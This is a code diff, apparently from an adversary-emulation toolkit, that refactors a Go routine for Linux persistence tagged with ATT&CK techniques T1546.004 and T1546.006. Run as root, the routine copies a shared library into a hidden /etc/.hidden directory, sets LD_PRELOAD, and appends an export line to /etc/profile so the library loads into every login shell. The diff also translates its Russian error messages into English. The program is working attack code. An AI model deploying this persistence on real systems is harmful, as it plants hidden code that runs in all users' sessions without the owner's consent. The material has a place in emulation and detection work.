@@ -13,54 +13,96 @@ import (
 var (
 	libName = "preload.so"
 	libDir  = "/etc/.hidden"
-	libPath = filepath.Join(libDir, libName)
-	script  = "export LD_PRELOAD=" + libPath
 )
 
 func main() {
+	newPath := filepath.Join("assets", libName)
+	newLibPath := filepath.Join(libDir, libName)
+	script := "export LD_PRELOAD=" + newLibPath
+
 	if !system.IsRoot() {
 		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
 		return
 	}
+
 	fmt.Printf("%sT1546.004 Unix Shell Configuration Modification\n", tags.Info)
 	fmt.Printf("%sT1546.006 LD_PRELOAD\n", tags.Info)
-	err := editLdPreload()
+
+	createDir(libDir)
+
+	err := system.CopyFile(newPath, newLibPath, 0600)
 	if err != nil {
-		fmt.Printf("%s%s\n", tags.Err, err.Error())
+		fmt.Printf("Error when copying %s: %s\n", libName, err.Error())
+		return
 	}
-	err = editProfileFile()
+	fmt.Printf("%sFile %s has been successfully copied to %s\n", tags.Info, libName, newLibPath)
+
+	err = writeLibPathToLdPreload(newLibPath)
 	if err != nil {
-		fmt.Printf("%s%s\n", tags.Err, err.Error())
+		fmt.Printf("%sError when changing environment variable LD_PRELOAD: %s\n", tags.Err, err.Error())
 	}
-	out, _ := exec.Command("id").Output()
-	fmt.Println(string(out))
+
+	err = addScriptToProfile(script)
+	if err != nil {
+		fmt.Printf("%sError when modifying the /etc/profile file: %s\n", tags.Err, err.Error())
+	}
+
+	out, err := exec.Command("id").Output()
+	if err != nil {
+		fmt.Printf("%sFailed to execute 'id': %s\n", tags.Err, err.Error())
+	} else {
+		fmt.Println(string(out))
+	}
 }
 
-func editProfileFile() error {
-	profileFile := files.NewFile("/etc/profile")
-	content, err := profileFile.ReadFileLines()
+func createDir(libDir string) {
+	err := os.Mkdir(libDir, 0700)
 	if err != nil {
-		return fmt.Errorf("ошибка при чтении /etc/profile")
+		fmt.Printf("%sError creating directory %s: %s\n", tags.Log, libDir, err.Error())
+	} else {
+		fmt.Printf("%sThe %s directory was successfully created\n", tags.Log, libDir)
 	}
-	fmt.Printf("%sДобавлена строка %s в /etc/profile\n", tags.Log, script)
-	content = append(content, script)
-	err = profileFile.WriteFileLines(content, 0644)
+}
+
+func writeLibPathToLdPreload(libPath string) error {
+	err := os.Setenv("LD_PRELOAD", libPath)
 	if err != nil {
-		return fmt.Errorf("ошибка при записи в /etc/profile")
+		return fmt.Errorf("error when setting environment variable LD_PRELOAD: %s", err.Error())
 	}
 	return nil
 }
 
-func editLdPreload() error {
-	os.Mkdir(libDir, 0600)
-	err := system.CopyFile(filepath.Join("assets", libName), libPath, 0600)
+func addScriptToProfile(script string) error {
+	content, err := readProfileFile()
 	if err != nil {
-		return fmt.Errorf("ошибка при копировании %s: %s", libName, err.Error())
+		return err
 	}
-	fmt.Printf("%sФайл %s успешно скопирован в %s\n", tags.Log, libName, libPath)
-	err = os.Setenv("LD_PRELOAD", libPath)
+
+	content = append(content, script)
+
+	err = writeProfileFile(content)
 	if err != nil {
-		return fmt.Errorf("ошибка при установлении переменной окружения  LD_PRELOAD: %s", err)
+		return err
+	}
+
+	fmt.Printf("%sAdded %s line to /etc/profile\n", tags.Log, script)
+	return nil
+}
+
+func readProfileFile() ([]string, error) {
+	profileFile := files.NewFile("/etc/profile")
+	content, err := profileFile.ReadFileLines()
+	if err != nil {
+		return nil, fmt.Errorf("error reading /etc/profile")
+	}
+	return content, nil
+}
+
+func writeProfileFile(content []string) error {
+	profileFile := files.NewFile("/etc/profile")
+	err := profileFile.WriteFileLines(content, 0644)
+	if err != nil {
+		return fmt.Errorf("error when writing to /etc/profile")
 	}
 	return nil
 }
